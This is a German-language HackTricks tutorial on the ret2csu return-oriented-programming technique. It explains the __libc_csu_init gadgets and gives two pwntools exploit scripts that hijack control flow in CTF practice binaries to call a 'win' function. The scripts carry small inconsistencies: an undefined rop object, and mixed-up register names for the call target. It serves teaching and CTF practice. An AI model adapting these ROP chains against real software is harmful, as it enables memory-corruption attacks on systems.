# Ret2csu

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

##

## [https://www.scs.stanford.edu/brop/bittau-brop.pdf](https://www.scs.stanford.edu/brop/bittau-brop.pdf)Grundinformationen

**ret2csu** ist eine Hacking-Technik, die verwendet wird, wenn Sie versuchen, die Kontrolle √ºber ein Programm zu √ºbernehmen, aber die **gadgets** nicht finden k√∂nnen, die Sie normalerweise verwenden, um das Verhalten des Programms zu manipulieren.

Wenn ein Programm bestimmte Bibliotheken (wie libc) verwendet, hat es einige integrierte Funktionen, um zu verwalten, wie verschiedene Teile des Programms miteinander kommunizieren. Unter diesen Funktionen gibt es einige versteckte Sch√§tze, die als unsere fehlenden Gadgets fungieren k√∂nnen, insbesondere eines namens `__libc_csu_init`.

### Die magischen Gadgets in \_\_libc\_csu\_init

In **`__libc_csu_init`** gibt es zwei Befehlsfolgen (gadgets), die hervorgehoben werden sollten:

1. Die erste Befehlsfolge erm√∂glicht es uns, Werte in mehreren Registern (rbx, rbp, r12, r13, r14, r15) einzurichten. Diese sind wie Slots, in denen wir Zahlen oder Adressen speichern k√∂nnen, die wir sp√§ter verwenden m√∂chten.
```armasm
pop rbx;
pop rbp;
pop r12;
pop r13;
pop r14;
pop r15;
ret;
```
Dieses Gadget erm√∂glicht es uns, diese Register zu steuern, indem wir Werte vom Stack in sie hineinpoppen.

2. Die zweite Sequenz verwendet die Werte, die wir eingerichtet haben, um ein paar Dinge zu tun:
* **Bestimmte Werte in andere Register verschieben**, um sie bereit zu machen, dass wir sie als Parameter in Funktionen verwenden k√∂nnen.
* **Einen Aufruf zu einem Ort durchf√ºhren**, der bestimmt wird, indem die Werte in r15 und rbx zusammenaddiert und dann rbx mit 8 multipliziert werden.
```armasm
mov rdx, r15;
mov rsi, r14;
mov edi, r13d;
call qword [r12 + rbx*8];
```
3. Vielleicht kennst du keine Adresse, um dort zu schreiben, und du **brauchst eine `ret`-Anweisung**. Beachte, dass das zweite Gadget ebenfalls mit einem `ret` **endet**, aber du musst einige **Bedingungen** erf√ºllen, um es zu erreichen:
```armasm
mov rdx, r15;
mov rsi, r14;
mov edi, r13d;
call qword [r12 + rbx*8];
add rbx, 0x1;
cmp rbp, rbx
jnz <func>
...
ret
```
Die Bedingungen sind:

* `[r12 + rbx*8]` muss auf eine Adresse zeigen, die eine aufrufbare Funktion speichert (wenn keine Idee und kein pie, kannst du einfach die `_init`-Funktion verwenden):
* Wenn \_init bei `0x400560` ist, verwende GEF, um einen Zeiger im Speicher darauf zu suchen und mache `[r12 + rbx*8]` zur Adresse mit dem Zeiger auf \_init:
```bash
# Example from https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html
gef‚û§  search-pattern 0x400560
[+] Searching '\x60\x05\x40' in memory
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x400000-0x401000), permission=r-x
0x400e38 - 0x400e44  ‚Üí   "\x60\x05\x40[...]"
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x600000-0x601000), permission=r--
0x600e38 - 0x600e44  ‚Üí   "\x60\x05\x40[...]"
```
* `rbp` und `rbx` m√ºssen den gleichen Wert haben, um den Sprung zu vermeiden
* Es gibt einige ausgelassene Pops, die Sie ber√ºcksichtigen m√ºssen

## RDI und RSI

Eine weitere M√∂glichkeit, **`rdi`** und **`rsi`** vom ret2csu-Gadget zu steuern, besteht darin, auf spezifische Offsets zuzugreifen:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="283"><figcaption><p><a href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">https://www.scs.stanford.edu/brop/bittau-brop.pdf</a></p></figcaption></figure>

√úberpr√ºfen Sie diese Seite f√ºr weitere Informationen:

{% content-ref url="brop-blind-return-oriented-programming.md" %}
[brop-blind-return-oriented-programming.md](brop-blind-return-oriented-programming.md)
{% endcontent-ref %}

## Beispiel

### Verwendung des Aufrufs

Stellen Sie sich vor, Sie m√∂chten einen Syscall durchf√ºhren oder eine Funktion wie `write()` aufrufen, ben√∂tigen jedoch spezifische Werte in den Registern `rdx` und `rsi` als Parameter. Normalerweise w√ºrden Sie nach Gadgets suchen, die diese Register direkt setzen, aber Sie k√∂nnen keine finden.

Hier kommt **ret2csu** ins Spiel:

1. **Register einrichten**: Verwenden Sie das erste magische Gadget, um Werte vom Stack in rbx, rbp, r12 (edi), r13 (rsi), r14 (rdx) und r15 zu poppen.
2. **Zweites Gadget verwenden**: Mit diesen gesetzten Registern verwenden Sie das zweite Gadget. Dies erm√∂glicht es Ihnen, Ihre gew√§hlten Werte in `rdx` und `rsi` (von r14 und r13) zu verschieben und die Parameter f√ºr einen Funktionsaufruf vorzubereiten. Dar√ºber hinaus k√∂nnen Sie durch die Kontrolle von `r15` und `rbx` das Programm dazu bringen, eine Funktion an der Adresse aufzurufen, die Sie berechnen und in `[r15 + rbx*8]` platzieren.

Sie haben ein [**Beispiel, das diese Technik verwendet und es hier erkl√§rt**](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation), und dies ist der endg√ºltige Exploit, den es verwendet:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

POP_CHAIN = 0x00401224 # pop r12, r13, r14, r15, ret
REG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x00404028

rop.raw('A' * 40)
rop.gets(RW_LOC)
rop.raw(POP_CHAIN)
rop.raw(0)                      # r12
rop.raw(0)                      # r13
rop.raw(0xdeadbeefcafed00d)     # r14 - popped into RDX!
rop.raw(RW_LOC)                 # r15 - holds location of called function!
rop.raw(REG_CALL)               # all the movs, plus the call

p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['win']))            # send to gets() so it's written
print(p.recvline())                        # should receive "Awesome work!"
```
{% hint style="warning" %}
Beachten Sie, dass der vorherige Exploit nicht dazu gedacht ist, ein **`RCE`** durchzuf√ºhren, sondern lediglich eine Funktion namens **`win`** aufzurufen (indem die Adresse von `win` aus stdin, die in der ROP-Kette durch gets aufgerufen wird, entnommen und in r15 gespeichert wird) mit einem dritten Argument mit dem Wert `0xdeadbeefcafed00d`.
{% endhint %}

### Umgehen des Aufrufs und Erreichen von ret

Der folgende Exploit wurde [**von dieser Seite**](https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html) extrahiert, wo **ret2csu** verwendet wird, aber anstelle des Aufrufs wird **die √úberpr√ºfung umgangen und `ret`** nach dem Aufruf erreicht:
```python
# Code from https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html
# This exploit is based off of: https://www.rootnetsec.com/ropemporium-ret2csu/

from pwn import *

# Establish the target process
target = process('./ret2csu')
#gdb.attach(target, gdbscript = 'b *    0x4007b0')

# Our two __libc_csu_init rop gadgets
csuGadget0 = p64(0x40089a)
csuGadget1 = p64(0x400880)

# Address of ret2win and _init pointer
ret2win = p64(0x4007b1)
initPtr = p64(0x600e38)

# Padding from start of input to saved return address
payload = "0"*0x28

# Our first gadget, and the values to be popped from the stack

# Also a value of 0xf means it is a filler value
payload += csuGadget0
payload += p64(0x0) # RBX
payload += p64(0x1) # RBP
payload += initPtr # R12, will be called in `CALL qword ptr [R12 + RBX*0x8]`
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xdeadcafebabebeef) # R15 > soon to be RDX

# Our second gadget, and the corresponding stack values
payload += csuGadget1
payload += p64(0xf) # qword value for the ADD RSP, 0x8 adjustment
payload += p64(0xf) # RBX
payload += p64(0xf) # RBP
payload += p64(0xf) # R12
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xf) # R15

# Finally the address of ret2win
payload += ret2win

# Send the payload
target.sendline(payload)
target.interactive()
```
### Warum nicht einfach libc direkt verwenden?

In der Regel sind diese F√§lle auch anf√§llig f√ºr [**ret2plt**](../common-binary-protections-and-bypasses/aslr/ret2plt.md) + [**ret2lib**](ret2lib/), aber manchmal m√ºssen Sie mehr Parameter steuern, als mit den Gadgets, die Sie direkt in libc finden, leicht kontrolliert werden k√∂nnen. Zum Beispiel erfordert die Funktion `write()` drei Parameter, und **das Finden von Gadgets, um all diese direkt zu setzen, k√∂nnte nicht m√∂glich sein**.
